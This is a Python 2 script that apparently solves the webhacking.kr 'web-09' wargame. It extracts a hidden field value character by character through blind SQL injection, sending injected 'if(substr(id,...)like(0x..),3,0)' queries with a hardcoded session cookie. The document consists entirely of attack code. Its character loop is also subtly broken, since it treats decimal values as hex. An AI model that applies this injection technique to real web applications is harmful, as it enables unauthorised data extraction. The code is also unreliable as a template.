import requests,time

#if(substr(id,1,1)like(0x42),3,0)
result=''
ls=list()
word_sam=list()
cookies={'PHPSESSID':'fca36526f085fed53e76dd2f2fa77703'}
for y in range(1,12):
    for x in range(33,127):
        print time.time()
        res = requests.get("http://webhacking.kr/challenge/web/web-09/?no=if(substr(id,{},1)like(0x{}),3,0)".format(y,x), cookies=cookies)        
        if "Secret" in res.text:
            #print "success and url : %s" % res.url
            print "no=if(substr(id,{},1)like({}),3,0)".format(y,str(x).decode('hex'))
            ls.append(res.url + "\r\n")
            word_sam.append(str(x).decode('hex'))
print ls
print word_sam
